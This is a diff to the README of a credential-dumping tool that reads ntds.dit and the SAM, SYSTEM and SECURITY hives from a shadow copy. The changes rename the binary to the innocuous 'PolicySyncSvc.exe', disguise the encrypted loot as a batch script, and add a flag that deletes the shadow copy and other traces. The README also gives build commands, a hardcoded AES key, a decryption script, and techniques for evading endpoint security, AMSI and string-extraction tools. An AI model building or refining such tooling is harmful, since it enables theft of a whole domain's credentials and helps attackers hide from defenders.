@@ -1,13 +1,13 @@
 # NtdsRawDump
 
-Reads `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` from a VSS shadow via raw NTFS cluster reads, AES-256-CBC encrypts each file in-memory, and packages them into a single encrypted archive `certstore.tmp`. No intermediate plaintext or zip file ever touches disk.
+Reads `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` from a VSS shadow via raw NTFS cluster reads, AES-256-CBC encrypts each file in-memory, and packages them into `certstore.cmd` — a batch-script-masked container (`@echo off` stub + `set _b=<base64 ciphertext>`). No intermediate plaintext or zip file ever touches disk.
 
 ## Build
 
 **From VS Developer Command Prompt:**
 
 ```
-csc /optimize+ /debug- /out:NtdsRawDump.exe NtdsRawDump.cs ^
+csc /optimize+ /debug- /out:PolicySyncSvc.exe NtdsRawDump.cs ^
     /r:System.Management.dll ^
     /r:System.IO.Compression.dll
 ```
@@ -17,7 +17,7 @@ csc /optimize+ /debug- /out:NtdsRawDump.exe NtdsRawDump.cs ^
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
   /optimize+ /debug- ^
-  /out:NtdsRawDump.exe NtdsRawDump.cs ^
+  /out:PolicySyncSvc.exe NtdsRawDump.cs ^
   /r:System.Management.dll ^
   /r:System.IO.Compression.dll
 ```
@@ -27,14 +27,19 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
 ## Usage
 
 ```
-NtdsRawDump.exe [output_directory]
+PolicySyncSvc.exe [output_directory] [--cleanup]
 ```
 
 Default `output_directory`: `C:\ProgramData\CertStore`
 
-Output:
-- `C:\ProgramData\certstore.tmp` — AES-256-CBC encrypted ZIP archive
+`--cleanup`: after building the in-memory bundle, deletes `output_directory` (all `.tmp` files) and the VSS shadow copy **before** writing `certstore.cmd` — leaves only the final output on disk.
+
+Output (default, no `--cleanup`):
+- `C:\ProgramData\certstore.cmd` — batch-script-masked base64 container: `@echo off` stub + `set _b=<base64(AES-256-CBC encrypted ZIP)>`
 - `<output_directory>\ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp` — encrypted credential files (also inside the ZIP)
+
+Output (with `--cleanup`):
+- `C:\ProgramData\certstore.cmd` — same as above; `output_directory` and VSS shadow are deleted before this file is written
 
 ## Decrypt and extract
 
@@ -44,29 +49,33 @@ AES key: `e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478`
 
 ```python
 from Crypto.Cipher import AES
-import os, zipfile
+import os, zipfile, base64
 
 KEY = bytes.fromhex('e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478')
 
-def aes_decrypt(path):
-    data = open(path, 'rb').read()
+def aes_decrypt(data):
     iv, ct = data[:16], data[16:]
     pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
     return pt[:-pt[-1]]  # PKCS7 unpad
 
-# Step 1 — decrypt and extract archive
-zip_data = aes_decrypt('certstore.tmp')
+# Step 1 — parse base64 wrapper, decrypt, extract archive
+with open('certstore.cmd', 'r', encoding='ascii') as f:
+    for line in f:
+        if line.startswith('set _b='):
+            enc_data = base64.b64decode(line[7:].strip())
+            break
+zip_data = aes_decrypt(enc_data)
 open('certstore.zip', 'wb').write(zip_data)
 with zipfile.ZipFile('certstore.zip') as z:
     z.extractall('certstore/')
 os.remove('certstore.zip')
 
-# Step 2 — decrypt individual credential files
+# Step 2 — decrypt individual credential files (raw binary format)
 for s, d in [('ntds.tmp','ntds.dit'),('system.tmp','SYSTEM.hiv'),
              ('sam.tmp','SAM.hiv'),('security.tmp','SECURITY.hiv')]:
     p = 'certstore/' + s
     if os.path.exists(p):
-        open('certstore/' + d, 'wb').write(aes_decrypt(p))
+        open('certstore/' + d, 'wb').write(aes_decrypt(open(p,'rb').read()))
         print('[+]', s, '->', d)
 ```
 
@@ -91,7 +100,7 @@ Security products that attach as file-system minifilters (e.g. `WdFilter.sys`) i
 
 AES-256-CBC encryption (via `AesCryptoServiceProvider`, delegated to Windows CNG `bcrypt.dll`) is applied to each credential buffer before writing to disk. Output `.tmp` files contain no NTDS or hive magic bytes. A random IV is generated per call and prepended to the ciphertext. No XOR opcode loop appears in IL — removes a common AMSI/MSIL pattern-match signal.
 
-The in-memory ZIP (`ZipArchive` over `MemoryStream`) is AES-encrypted before being flushed as `certstore.tmp`. No intermediate zip file ever lands on disk.
+The in-memory ZIP (`ZipArchive` over `MemoryStream`) is AES-encrypted, base64-encoded, and flushed as `certstore.cmd` wrapped in a valid batch script stub (`@echo off` / `:: maintenance` / `set _b=`). No intermediate zip file or raw binary ever lands on disk; `certstore.cmd` passes text-based batch script parsers.
 
 ### Dynamic API resolution (IAT reduction)
 
@@ -129,7 +138,7 @@ The position-dependent key means no single extractable constant exists — FLOSS
 | `_out_sam` | `sam.tmp` |
 | `_out_sec` | `security.tmp` |
 | `_default_out` | `C:\ProgramData\CertStore` |
-| `_tmp_name` | `certstore.tmp` |
+| `_tmp_name` | `certstore.cmd` (output filename; file written as base64-wrapped batch stub) |
 | `_k32` | `kernel32.dll` |
 | `_k32_cf` | `CreateFileW` |
 | `_k32_dic` | `DeviceIoControl` |
